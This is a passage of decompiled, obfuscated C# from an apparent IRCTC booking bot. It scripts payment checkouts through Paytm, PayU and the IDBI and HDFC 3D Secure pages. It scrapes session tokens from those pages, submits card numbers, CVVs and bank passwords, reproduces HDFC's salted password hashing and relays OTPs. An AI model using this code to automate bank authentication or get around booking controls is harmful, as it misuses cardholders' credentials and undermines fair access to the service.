                    clsMain.Lock("First Hit Failed. err = " + string_92);
                    string_90 = "PayZap Gateway not working - Payment Failed";
                    result = false;
                    return false;
                }
                clsMain.Lock("second Hit success = " + string_93);
                response = string_93;
                string text8 = string_93.Substring(string_93.IndexOf("PaRes") + 14);
                text8 = text8.Substring(0, text8.IndexOf("\""));
                text = text3;
                string_91 = "https://acs2.onlinesbi.com/";
                text2 = class3_0.Method_SerialInp(string_93, ref text, false);
                text3 = text;
                updateTStatus_1.BeginInvoke(1, "Process (3/3)", tCntrlName_, null, null);
                if (!method_87(text, text2, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
                {
                    clsMain.Lock("First Hit Failed. err = " + string_92);
                    string_90 = "PayZap Gateway not working - Payment Failed";
                    result = false;
                    return false;
                }
                clsMain.Lock("third Hit success = " + string_93);
                string_89 = string_93;
                string_90 = text3;
                bool_14 = true;
                result = true;
                return true;
            }
            catch
            {
                return result;
            }
        }

        private bool method_150(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string_89 = "";
            string_90 = "";
            clsMain.Lock("Enter ProcessCC_PTM.  DETAILS: ");
            string string_91 = "https://secure.paytm.in/";
            string text = "";
            string text2 = "";
            string string_92 = "";
            string string_93 = "";
            CookieContainer cookieContainer_ = new CookieContainer();
            string_87.Split(new string[1] { "||" }, StringSplitOptions.None)[0].Trim();
            try
            {
                updateTStatus_1.BeginInvoke(1, "PAYTM Getway(1/4)", tCntrlName_, null, null);
                string_86 = clsMain.string_85;
                text = GetString(string_86, "callbackUrl");
                GetString(string_86, "TermUrl");
                string @string = GetString(string_86, "mbid");
                string string2 = GetString(string_86, "orderid");
                string string3 = GetString(string_86, "cardScheme");
                string string4 = GetString(string_86, "transId");
                string string5 = GetString(string_86, "mid");
                string string6 = GetString(string_86, "txnToken");
                string string7 = GetString(string_86, "txnamount");
                string string8 = GetString(string_86, "maskedCardNo");
                string string9 = GetString(string_86, "txnid");
                clsMain.Lock("First Hit Failed. err = " + text2);
                text = "https://securegw.paytm.in/instaproxy/directbank/HDFCADV/DC/payment/v2";
                text2 = "bankCode=HDFCADV&mbid=" + @string + "&orderid=" + string2 + "&paymentMode=DC&cardScheme=" + string3 + "&transId=" + string4 + "&cardType=DC&mid=" + string5 + "&bankAbbr=HDFC&merchantName=IRCTC&txnToken=" + string6 + "&txnamount=" + string7 + "&apiRequestOrigin=pg&maskedCardNo=" + string8 + "&isOTPRedirectFlow=true&merchantLogoUrl=https%3A%2F%2Fmerchant-static.paytm.com%2Fmerchant-dashboard%2Flogo%2FIRCTCw862137775%2Forg%2Flogo&merchantType=OFF_US&channelid=WEB&txnid=" + string9 + "&isResend=true";
                if (!method_87(text, text2, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
                {
                    clsMain.Lock("First Hit Failed. err = " + string_92);
                    string_90 = "PayZap Gateway not working - Payment Failed";
                    result = false;
                    return false;
                }
                updateTStatus_1.BeginInvoke(1, "PAYTM Getway(2/4)", tCntrlName_, null, null);
                text = "https://securegw.paytm.in/instaproxy/direct/payment/payonbank/v2";
                string_91 = "https://securegw.paytm.in/instaproxy/directbank/HDFCADV/CC/payment/v2";
                text2 = "bankCode=HDFCADV&mbid=" + string5 + "&orderid=" + string2 + "&paymentMode=CC&transId=" + string4 + "&mid=" + string5 + "&bankAbbr=HDFC&txnToken=" + string6 + "&txnamount=" + string7 + "&apiRequestOrigin=pg&response=retry&channelid=WEB&txnid=" + string9;
                if (!_Request(text, text2, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
                {
                    clsMain.Lock("First Hit Failed. err = " + string_92);
                    string_90 = "PayZap Gateway not working - Payment Failed";
                    result = false;
                    return false;
                }
                updateTStatus_1.BeginInvoke(1, "PAYTM Getway(3/4)", tCntrlName_, null, null);
                text2 = class3_0.Method_SerialInp(string_93, ref text, false);
                string_91 = "https://securegw.paytm.in/instaproxy/direct/payment/payonbank/v2";
                if (!_Request(text, text2, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_93, ref string_92, ref webException_0))
                {
                    clsMain.Lock("First Hit Failed. err = " + string_92);
                    string_90 = "PayZap Gateway not working - Payment Failed";
                    result = false;
                    return false;
                }
                if (!method_122(string_93, class3_0.BANKDETAILS, string_88, ref string_93, ref string_90, updateTStatus_2))
                {
                    clsMain.Lock("third Hit Failed. err = " + string_92);
                    string_90 = "3D Password Fail Gateway not working - Payment Failed";
                    result = false;
                    return false;
                }
                clsMain.Lock("second Hit success = " + string_93);
                updateTStatus_1.BeginInvoke(1, "PAYTM Getway(4/4)", tCntrlName_, null, null);
                string_89 = string_93;
                string_90 = "https://netsafe.hdfcbank.com/";
                result = true;
                return true;
            }
            catch
            {
                return result;
            }
        }

        private bool method_151(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string_89 = "";
            string_90 = "";
            clsMain.Lock("Enter ProcessCC_PTM.  DETAILS: ");
            string text = "";
            string string_91 = "";
            string string_92 = "";
            CookieContainer cookieContainer_ = new CookieContainer();
            string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
            array[0].Trim();
            string str = array[7];
            try
            {
                updateTStatus_1.BeginInvoke(1, "IDBI Getway(1/5)", tCntrlName_, null, null);
                string_86 = clsMain.string_85;
                string @string = GetString(string_86, "callbackUrl");
                string string2 = GetString(string_86, "MD");
                @string.Split(new string[1] { "AccessControlServer?idct=" }, StringSplitOptions.None)[1].Trim().Split(new string[1] { ".V&" }, StringSplitOptions.None)[0].Trim();
                string string3 = GetString(string_86, "PaReq");
                string string4 = GetString(string_86, "TermUrl");
                clsMain.Lock("First Hit Failed. err = " + text);
                string string_93 = "https://secure.paytm.in/";
                text = "MD=" + string2 + "&PaReq=" + HttpUtility.UrlEncode(string3) + "&TermUrl=" + HttpUtility.UrlEncode(string4);
                if (!method_88(@string, text, string_93, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_92, ref string_91, ref webException_0))
                {
                    clsMain.Lock("First Hit Failed. err = " + string_91);
                    string_90 = "IDBI DC Gateway not working - Payment Failed";
                    result = false;
                    return false;
                }
                updateTStatus_1.BeginInvoke(1, "IDBI Getway(2/5)", tCntrlName_, null, null);
                string_93 = @string;
                string text2 = string_92.Split(new string[1] { "acs-web-v14/EnrollWeb/IDBIBank/auth/VBV.jsp;jsessionid=" }, StringSplitOptions.None)[1].Trim().Split(new string[1] { "\"" }, StringSplitOptions.None)[0].Trim();
                @string = "https://secureonline.idbibank.com/acs-web-v14/EnrollWeb/IDBIBank/auth/VBV.jsp;jsessionid=" + text2;
                string[] array2 = string_92.Split(new string[1] { "display:none" }, StringSplitOptions.None)[2].Trim().Split(new string[1] { "\"" }, StringSplitOptions.None);
                string text3 = array2[0].Trim();
                text3 = array2[6].Trim();
                string text4 = HttpUtility.UrlEncode(str);
                string[] array3 = Strings.Split(class3_0.string_72, "&&");
                Strings.Split(array3[0], "=");
                Strings.Split(array3[1], "=");
                Strings.Split(array3[2], "=\"");
                bool_42 = true;
                updateTStatus_1.BeginInvoke(1, "IDBI Getway(3/5)", tCntrlName_, null, null);
                string_13 = array3[0] + ";" + array3[1] + ";" + array3[2];
                if (!method_88(@string, null, string_93, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_92, ref string_91, ref webException_0))
                {
                    clsMain.Lock("First Hit Failed. err = " + string_91);
                    string_90 = "IDBI DC Gateway not working - Payment Failed";
                    result = false;
                    return false;
                }
                string_93 = @string;
                if (string_92.Contains("Your session has expired!"))
                {
                    updateTStatus_1.BeginInvoke(1, "session has expired", tCntrlName_, null, null);
                    result = false;
                    return false;
                }
                bool_42 = true;
                string text5 = string_92.Split(new string[1] { "randomDigit" }, StringSplitOptions.None)[1].Split(new string[1] { "\"" }, StringSplitOptions.None)[1];
                string_13 = array3[0] + ";" + array3[1] + ";" + array3[2] + ";enTrace=" + text5;
                updateTStatus_1.BeginInvoke(1, "IDBI Getway(4/5)", tCntrlName_, null, null);
                text = "txtLogin=" + text3 + "&txtPassword=" + text4 + "&cmdSubmit=Submit&xdeviceId=&bTz=";
                @string = "https://secureonline.idbibank.com/acs-web-v14/EnrollWeb/IDBIBank/server/AccessControlServer?perform=USER_AUTH&CANCEL=false&ISSUER_ID=%208114";
                if (!method_88(@string, text, string_93, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_92, ref string_91, ref webException_0))
                {
                    clsMain.Lock("First Hit Failed. err = " + string_91);
                    string_90 = "IDBI DC Gateway not working - Payment Failed";
                    result = false;
                    return false;
                }
                if (string_92.Contains("Your session has expired!"))
                {
                    updateTStatus_1.BeginInvoke(1, "session has expired", tCntrlName_, null, null);
                    result = false;
                    return false;
                }
                updateTStatus_1.BeginInvoke(1, "IDBI Getway(5/5)", tCntrlName_, null, null);
                clsMain.Lock("fifth Hit success = " + string_92);
                string_89 = string_92;
                string_90 = "https://secureonline.idbibank.com/";
                result = true;
                return true;
            }
            catch
            {
                return result;
            }
        }

        internal bool Multi_PayUWeb(string A_1, string A_2, string A_3, string A_4, ref string A_5, ref string A_6, UpdateTStatus A_7)
        {
            response = A_1;
            bool flag = clsMain.LoginType == "WEB";
            bool result = false;
            A_5 = "";
            A_6 = "";
            string text = "";
            A_3 = A_3.ToUpper();
            clsMain.Lock("Enter ProcessCC_RAZ.  DETAILS: ");
            bool flag2 = !A_1.Contains("razorpay");
            string text2 = A_3;
            string text3 = "";
            string string_ = class3_0.string_18;
            string[] array = A_2.Split(new string[1] { "||" }, StringSplitOptions.None);
            string text4 = array[0].Trim();
            string text5 = array[1];
            string text6 = "";
            string text7 = "";
            string text8 = "";
            string text9 = "";
            string a_ = "";
            string text10 = "";
            string text11 = "";
            if (A_3.Contains("_DC") || A_3.Contains("_CC"))
            {
                text3 = "DC";
                text6 = array[2];
                text8 = array[3];
                text7 = array[4];
                text9 = array[6];
                a_ = array[7];
                if (text5.Length < 2)
                {
                    text5 = "0" + text5;
                }
                if ((text2 == "HDFC_DC") | text2.Contains("HDFC_CC"))
                {
                    text11 = "21";
                }
                else if ((text2 == "SBI_DC") | text2.Contains("SBI_CC"))
                {
                    text11 = "101";
                }
                else if (text2.Contains("IDBI_"))
                {
                    text11 = "24";
                }
                else if (text2.Contains("AIRTEL_"))
                {
                    text11 = "102";
                }
                else if (text2.Contains("KOTAK_"))
                {
                    text11 = "KOTAK_DC";
                }
            }
            else if (A_3.Contains("BHIMUPI"))
            {
                text3 = "BHIMUPI";
            }
            else
            {
                text3 = "NB";
                switch (text2)
                {
                    case "HDFC":
                        text2 = "HDFC";
                        text11 = "36";
                        break;
                    case "SBI":
                        text2 = "SBI";
                        text11 = "1";
                        break;
                    case "ICICI":
                        text2 = "ICICI";
                        text11 = "44";
                        break;
                    case "UNION":
                        text2 = "UNI";
                        text11 = "28";
                        break;
                    case "INDUSIND":
                        text2 = "INIB";
                        text11 = "45";
                        break;
                    case "IDBI":
                        text2 = "IDBI";
                        text11 = "52";
                        break;
                    case "YES":
                        text2 = "YES";
                        text11 = "60";
                        break;
                    case "CORP":
                        text2 = "CORP";
                        text11 = "56";
                        break;
                    case "Razor":
                        text2 = "PPI";
                        break;
                }
            }
            try
            {
                if (!flag)
                {
                    string text12 = response.Substring(response.IndexOf("amount") + 9);
                    text = text12.Substring(0, text12.IndexOf("\""));
                    string text13 = response.Substring(response.IndexOf("encdata") + 18);
                    string text14 = text13.Substring(0, text13.IndexOf("\""));
                    url = "https://payments.payu.in/irctcMobileApp";
                    postdata = "encdata=" + text14;
                }
                else
                {
                    postdata = class3_0.Method_SerialInp(response, ref url, false);
                }
                updateTStatus_1.BeginInvoke(1, "Init. " + text3 + "(1/6)", tCntrlName_, null, null);
                if (!_Request(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                updateTStatus_1.BeginInvoke(1, "Init. " + text3 + "(2/6)", tCntrlName_, null, null);
                postdata = class3_0.Method_SerialInp(response, ref url, false);
                bool_14 = true;
                bool_11 = true;
                if (!_Request(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                string[] array2 = string_16.Split(new string[1] { "#/" }, StringSplitOptions.None);
                string text15 = array2[1];
                url = "https://api.payu.in/checkoutx?paymentId=" + text15;
                postdata = "";
                if (!_Request(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                string @string = GetString(response, "accessToken");
                postdata = "{\"window3DUsed\":false,\"userAgent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36\",\"name\":\"NetBanking\",\"bankCode\":\"" + text3 + "\",\"accessToken\":\"" + @string + "\",\"paymentId\":\"" + text15 + "\",\"broker\":\"PAYU\"}";
                if (A_3.Contains("_DC") || A_3.Contains("_CC"))
                {
                    string text16 = text4.Substring(0, 6);
                    postdata = "{\"mcpEligibleFlag\":1,\"mcpCurrencyOrder\":\"USD,EUR,CAD,AED,GBP,AUD,SGD,INR\",\"merchantBaseCurrency\":\"INR\",\"bin\":\"" + text16 + "\",\"accessToken\":\"" + @string + "\",\"paymentId\":\"" + text15 + "\"}";
                    url = "https://api.payu.in/bin/binBasedDetails";
                    bool_29 = true;
                    if (!_Request(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                    {
                        clsMain.Lock("Getting payment out error= " + response);
                        return false;
                    }
                    string string2 = GetString(response, "bankCode");
                    postdata = "{\"window3DUsed\":false,\"userAgent\":\"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\",\"name\":\"DebitCard\",\"bankCode\":\"" + string2 + "\",\"accessToken\":\"" + @string + "\",\"paymentId\":\"" + text15 + "\",\"broker\":\"PAYU\",\"cardNumber\":\"" + text4 + "\",\"cvv\":\"" + text7 + "\",\"validThrough\":\"" + text5 + "/" + text6 + "\",\"storeCard\":false,\"ownerName\":\"" + text9 + "\"}";
                }
                url = "https://api.payu.in/payments";
                bool_40 = true;
                bool_29 = true;
                if (!_Request(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                byte[] bytes = Convert.FromBase64String(GetString(response, "acsTemplate"));
                response = Encoding.UTF8.GetString(bytes);
                bool flag3 = false;
                switch (text11)
                {
                    case "36":
                        flag3 = HdfcPAYTM(response, class3_0.BANKDETAILS, A_4, ref response, ref A_6, A_7);
                        break;
                    case "21":
                        flag3 = Pyu_HdfcDEBIT(response, reff, cookieContainer_0, a_, ref response, ref A_6);
                        break;
                    case "KOTAK_DC":
                        updateTStatus_1.BeginInvoke(1, "Init. " + text3 + "(3/6)", tCntrlName_, null, null);
                        postdata = class3_0.Method_SerialInp(response, ref url, false);
                        if (!_Request(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                        if (!_Request(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                        {
                            clsMain.Lock("Getting payment out error= " + response);
                            return false;
                        }
                        flag3 = true;
                        break;
                }
                if (flag3)
                {
                    updateTStatus_1.BeginInvoke(1, "Init. " + text3 + "(4/6)", tCntrlName_, null, null);
                    postdata = class3_0.Method_SerialInp(response, ref url, false);
                    if (!_Request(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                    {
                        clsMain.Lock("Getting payment out error= " + response);
                        return false;
                    }
                    updateTStatus_1.BeginInvoke(1, "Init. " + text3 + "(6/6)", tCntrlName_, null, null);
                    postdata = class3_0.Method_SerialInp(response, ref url, false);
                    if (!_Request(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                    {
                        clsMain.Lock("Getting payment out error= " + response);
                        return false;
                    }
                    if (response.Contains("irctc.co.in/eticketing/"))
                    {
                        A_6 = url;
                        A_5 = response;
                        result = true;
                    }
                }
            }
            catch (Exception)
            {
                result = false;
            }
            return result;
        }

        private bool Pyu_HdfcDEBIT(string A_1, string A_2, CookieContainer A_3, string A_4, ref string A_5, ref string A_6)
        {
            string string_ = "";
            string text = "";
            string string_2 = text;
            string text2 = A_1;
            string string_3 = text2;
            bool flag = false;
            clsMain.Lock("Enter ProcessHdfcCC.");
            int num = 0;
            int num2 = 0;
            if (text2.IndexOf("netsafe.hdfcbank.com") < 0)
            {
                int num3 = text2.IndexOf("window.location");
                if (text2.IndexOf("hdfc-acs.wibmo.com") > 0)
                {
                    postdata = class3_0.Method_SerialInp(A_1, ref url, true);
                    if (!_Request(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref A_1, ref string_2, ref webException_0))
                    {
                        clsMain.Lock("Getting payment out error= " + A_1);
                        return false;
                    }
                    postdata = class3_0.Method_SerialInp(A_1, ref url, true);
                    url = "https://hdfc-acs.wibmo.com" + url;
                    postdata += HttpUtility.UrlEncode(A_4);
                    if (!_Request(url, postdata, reff, webProxy_2, ref cookieContainer_0, true, true, 60000, 60000, ref A_1, ref string_2, ref webException_0))
                    {
                        clsMain.Lock("Getting payment out error= " + A_1);
                        return false;
                    }
                    A_5 = A_1;
                    A_6 = A_2;
                    return true;
                }
            }
            updateTStatus_1.BeginInvoke(1, "Init. HDFC Netsafe-1/3", tCntrlName_, null, null);
            bool result;
            while (true)
            {
                try
                {
                    text2 = class3_0.Method_SerialInp(A_1, ref string_, true);
                    if (!_Request(string_, text2, A_2, webProxy_2, ref A_3, true, true, 60000, 60000, ref string_3, ref string_2, ref webException_0))
                    {
                        string text3 = A_3?.ToString() + " Gateway not working - Payment Failed";
                        clsMain.Lock("First Hit Failed. err = " + text3);
                        return flag;
                    }
                    A_2 = string_;
                    string text4 = "https://netsafe.hdfcbank.com";
                    while (true)
                    {
                        if (A_4 == "")
                        {
                            clsMain.Lock("ProcessHdfcCC OTP Processing.");
                            string text5 = "";
                            frmOTP frmOTP = new frmOTP();
                            frmOTP.method_1(clsMain.control_0, clsMain.rectangle_0, true, "HDFC OTP", class3_0.BANKSAVEAS);
                            if (frmOTP.DialogResult != DialogResult.OK)
                            {
                                frmOTP.Dispose();
                                return false;
                            }
                            text5 = frmOTP.string_0;
                            frmOTP.Dispose();
                            string string_4 = "txtOtpPassword=" + text5 + "&cmdSubmitDynamic=";
                            string text6 = string_3.Substring(string_3.IndexOf("function redirectUrlCancel(choiceType)"));
                            num = text6.IndexOf(".action =");
                            num = text6.IndexOf("\"", num) + 1;
                            num2 = text6.IndexOf("\"", num) - num;
                            string text7 = text6.Substring(num, num2);
                            string string_5 = text4 + text7.Replace("true", "false");
                            updateTStatus_1.BeginInvoke(1, "Init. HDFC Netsafe-2/3", tCntrlName_, null, null);
                            string string_6 = A_2;
                            _Request(string_5, string_4, string_6, webProxy_2, ref A_3, true, true, 60000, 60000, ref string_3, ref string_2, ref webException_0);
                        }
                        else
                        {
                            clsMain.Lock("ProcessHdfcCC 3D Password Processing.");
                            string text8 = "";
                            if (string_3.IndexOf("Select Any Option", StringComparison.CurrentCultureIgnoreCase) > 0)
                            {
                                num = string_3.IndexOf("randomDigit");
                                num = string_3.IndexOf("\"", num) + 1;
                                num2 = string_3.IndexOf("\"", num) - num;
                                string text9 = string_3;
                                int startIndex = num;
                                int length = num2;
                                string text10 = text9.Substring(startIndex, length);
                                string_ = text4 + "/ACSWeb/jsp/SCode.jsp";
                                if (string_3.IndexOf("ACSWeb/jsp/PayerAuth.jsp", StringComparison.CurrentCultureIgnoreCase) > 0)
                                {
                                    flag = true;
                                    string_ = text4 + "/ACSWeb/jsp/PayerAuth.jsp";
                                }
                                else if (string_3.IndexOf("jsp/DinerAuth.jsp", StringComparison.CurrentCultureIgnoreCase) > 0)
                                {
                                    string_ = text4 + "/ACSWeb/jsp/DinerAuth.jsp";
                                }
                                string string_7 = "acsRadio=payerAuth&sbmtBtn=Continue&xdeviceId=" + text10 + "&bTz=undefined";
                                if (!_Request(string_, string_7, A_2, webProxy_2, ref A_3, true, true, 60000, 60000, ref string_3, ref string_2, ref webException_0))
                                {
                                    A_6 = "Failed after Payment, Check Status.";
                                    string text11 = "Second Hit Failed. err = ";
                                    string text12 = string_2;
                                    clsMain.Lock(text11 + text12);
                                    return false;
                                }
                                num = string_3.IndexOf("ACTION=");
                                num = string_3.IndexOf("\"", num) + 1;
                                num2 = string_3.IndexOf("\"", num) - num;
                                text8 = string_3.Substring(num, num2);
                            }
                            else
                            {
                                string text13 = string_3.Substring(string_3.IndexOf("function redirectUrlCancel(choiceType)"));
                                num = text13.IndexOf(".action =");
                                num = text13.IndexOf("\"", num) + 1;
                                num2 = text13.IndexOf("\"", num) - num;
                                text8 = text13.Substring(num, num2);
                                text8 = text8.Replace("DYNAMIC_AUTHENTICATION_IMPROVEMENT", "USER_AUTH_IMPROVEMENT");
                            }
                            text2 = class3_0.Method_SerialInp(string_3, ref string_, true);
                            text2 = "txtLogin=&txtPassword=&textSalt=";
                            string text14 = "";
                            num = string_3.IndexOf("hidden\" name=\"txtLogin");
                            num = string_3.IndexOf("value=\"", num) + 7;
                            num2 = string_3.IndexOf("\"", num);
                            text14 = string_3.Substring(num, num2 - num);
                            text2 = clsPostData.SetPost(text2, "txtLogin", text14);
                            num = string_3.IndexOf("var saltx =");
                            num = string_3.IndexOf("\"", num) + 1;
                            num2 = string_3.IndexOf("\"", num);
                            text14 = string_3.Substring(num, num2 - num);
                            text2 = clsPostData.SetPost(text2, "textSalt", text14);
                            string text15 = computeSHA_256(A_4);
                            text15 = computeSHA_256(text15 + text14);
                            text2 = clsPostData.SetPost(text2, "txtPassword", HttpUtility.UrlEncode(text15));
                            text2 = clsPostData.SetPost(text2, "cmdSubmit", "Submit");
                            string_ = text4 + text8.Replace("true", "false");
                            if (!_Request(string_, text2, A_2, webProxy_2, ref A_3, true, true, 60000, 60000, ref string_3, ref string_2, ref webException_0))
                            {
                                A_6 = "Third Hit Failed, Check Status.";
                                return false;
                            }
                            if (string_3.IndexOf("perform\" value=\"USER_AUTH_IMPROVEMENT", StringComparison.CurrentCultureIgnoreCase) > 0)
                            {
                                updateTStatus_1.BeginInvoke(1, "Init. HDFC Netsafe-3/3", tCntrlName_, null, null);
                                string string_8 = class3_0.Method_SerialInp(string_3, ref string_, true);
                                if (!_Request(string_, string_8, A_2, webProxy_2, ref A_3, true, true, 60000, 60000, ref string_3, ref string_2, ref webException_0))
                                {
                                    A_6 = "Failed after Payment, Check Status.";
                                    string text16 = "Fourth Hit Failed. err = ";
                                    string text17 = string_2;
                                    clsMain.Lock(text16 + text17);
                                    return false;
                                }
                            }
                            if (string_3.IndexOf("Enter OTP", StringComparison.CurrentCultureIgnoreCase) > 0)
                            {
                                A_4 = "";
                                continue;
                            }
                            if (string_3.IndexOf("com.enstage.entransact.servers.AccessControlServerSSL", StringComparison.CurrentCultureIgnoreCase) > 0)
                            {
                                A_4 = "";
                                A_1 = string_3;
                                break;
                            }
                            if (string_3.IndexOf("form name=\"frmMerchantPost", StringComparison.CurrentCultureIgnoreCase) <= 0)
                            {
                                A_4 = "";
                                continue;
                            }
                        }
                        if (!flag)
                        {
                            A_2 = string_;
                            string string_9 = class3_0.Method_SerialInp(string_3, ref string_, true);
                            string value = "form name=\"frmMerchantPost";
                            if (!string_3.Contains(value) && !_Request(string_, string_9, A_2, webProxy_2, ref A_3, true, true, 60000, 60000, ref string_3, ref string_2, ref webException_0))
                            {
                                A_6 = "Failed after Payment, Check Status.";
                                string text18 = "Fourth Hit Failed. err = ";
                                string text19 = string_2;
                                string string_10 = text18 + text19;
                                clsMain.Lock(string_10);
                                return false;
                            }
                        }
                        clsMain.Lock("Success ProcessHdfcCC Finish");
                        A_5 = string_3;
                        string text20 = (A_6 = A_2);
                        bool flag2 = true;
                        result = flag2;
                        goto end_IL_08f9;
                    }
                }
                catch (Exception)
                {
                    result = false;
                    break;
                }
                continue;
            end_IL_08f9:
                break;
            }
            return result;
        }

        internal bool PayU_Indus(string string_86, string string_87, string string_88, string string_89, ref string string_90, ref string string_91, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string_90 = "";
            string_91 = "";
            string_88 = string_88.ToUpper();
            class3_0.string_72 = "";
            clsMain.Lock("Enter ProcessCC_RAZ.  DETAILS: ");
            string_86.Contains("razorpay");
            string text = string_88;
            string[] array = string_87.Split(new string[1] { "||" }, StringSplitOptions.None);
            string text2 = array[0].Trim();
            string text3 = array[1];
            string text4 = "";
            string text5 = "";
            string text6 = "";
            string string_92 = "";
            string text7 = "";
            string text8;
            if (string_88.Contains("_DC") || string_88.Contains("_CC"))
            {
                text8 = "DC";
                text4 = array[2];
                text5 = array[4];
                text6 = array[6];
                if (text3.Length < 2)
                {
                    text3 = "0" + text3;
                }
                if ((text == "HDFC_DC") | text.Contains("HDFC_CC"))
                {
                    text7 = "21";
                }
                else if ((text == "SBI_DC") | text.Contains("SBI_CC"))
                {
                    text7 = "101";
                }
                else if (text.Contains("AIRTEL_CC"))
                {
                    text7 = "102";
                }
                else if (text.Contains("KOTAK_"))
                {
                    text7 = "KOTAK_DC";
                }
            }
            else if (string_88.Contains("BHIMUPI") || string_88.Contains("PHONEPE") || string_88.Contains("INDUSUPI"))
            {
                text8 = "INDUSUPI";
            }
            else
            {
                text8 = "NB";
                string text9 = text;
                switch (Class46.smethod_0(text9))
                {
                    case 1031356403u:
                        if (text9 == "PAYUHDFC")
                        {
                            text = "HDFB";
                            text7 = "36";
                        }
                        break;
                    case 1005593931u:
                        if (text9 == "SBI")
                        {
                            text = "SBI";
                            text7 = "1";
                        }
                        break;
                    case 1934763940u:
                        if (text9 == "ICICI")
                        {
                            text = "ICICI";
                            text7 = "44";
                        }
                        break;
                    case 1145574292u:
                        if (text9 == "UNION")
                        {
                            text = "UNI";
                            text7 = "28";
                        }
                        break;
                    case 2596969871u:
                        if (text9 == "Razor")
                        {
                            text = "PPI";
                        }
                        break;
                    case 2471879920u:
                        if (text9 == "YES")
                        {
                            text = "YES";
                            text7 = "60";
                        }
                        break;
                    case 4249340199u:
                        if (text9 == "INDUSIND")
                        {
                            text = "INIB";
                            text7 = "45";
                        }
                        break;
                    case 4021309901u:
                        if (text9 == "CORP")
                        {
                            text = "CORP";
                            text7 = "56";
                        }
                        break;
                    case 3504019421u:
                        if (text9 == "IDBI")
                        {
                            text = "IDBI";
                            text7 = "52";
                        }
                        else if (text9 == "AIRTELMONEY")
                        {
                            text = "Air";
                            text7 = "52";
                        }
                        break;
                }
            }
            try
            {
                postdata = class3_0.Method_SerialInp(string_86, ref string_92, false);
                if (clsMain.LoginType == "APP")
                {
                    string_92 = GetString_(string_86, "bankUrl\",\"value", "\"");
                    postdata = "encdata=" + GetString_(string_86, "encdata\",\"value", "\"");
                }
                if (updateTStatus_1 != null)
                {
                    updateTStatus_1.BeginInvoke(1, "PayuMoney Process " + text8 + "(1/6)", tCntrlName_, null, null);
                }
                if (!_Request(string_92, postdata, Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref response, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + response);
                    return false;
                }
                string urlll = "https://txncdn.payubiz.in/login";
                Reffral = "https://indusirctc.payu.in/";
                if (!_Request(urlll, "", Reffral, webProxy_1, ref cookieContainer_1, true, true, 60000, 60000, ref responseIn, ref errormsg, ref webException_0))
                {
                    clsMain.Lock("Getting payment out error= " + responseIn);
                    return false;
                }
                postdata = class3_0.Method_SerialInp(response, ref string_92, false);
                string text10 = response.Substring(response.IndexOf("key") + 12);
                string text11 = text10.Substring(0, text10.IndexOf("\""));
                text10 = response.Substring(response.IndexOf("txnid") + 14);
                string text12 = text10.Substring(0, text10.IndexOf("\""));
                text10 = response.Substring(response.IndexOf("amount") + 15);
                string text13 = text10.Substring(0, text10.IndexOf("\""));
                text10 = response.Substring(response.IndexOf("hash") + 13);
                string text14 = text10.Substring(0, text10.IndexOf("\""));
                postdata = "key=" + text11 + "&productinfo=IRCTC+TICKET&hash=" + text14 + "&txnid=" + text12 + "&amount=" + text13 + "&firstname=IrctcCustomer&email=IrctcCustomer%40example.com&phone=9999999999&surl=https%3A%2F%2Fpayments.payu.in%2FIrctc&furl=https%3A%2F%2Fpayments.payu.in%2FIrctc&udf1=0&udf2=NOUPI&curl=https%3A%2F%2Fpayments.payu.in%2FIrctc&enforce_paymethod=creditcard%7Cdebitcard%7Cnetbanking%7Ccashcard";
                if (string_88.Contains("BHIMUPI") | string_88.Contains("PHONEPE") | string_88.Contains("INDUSUPI"))
                {
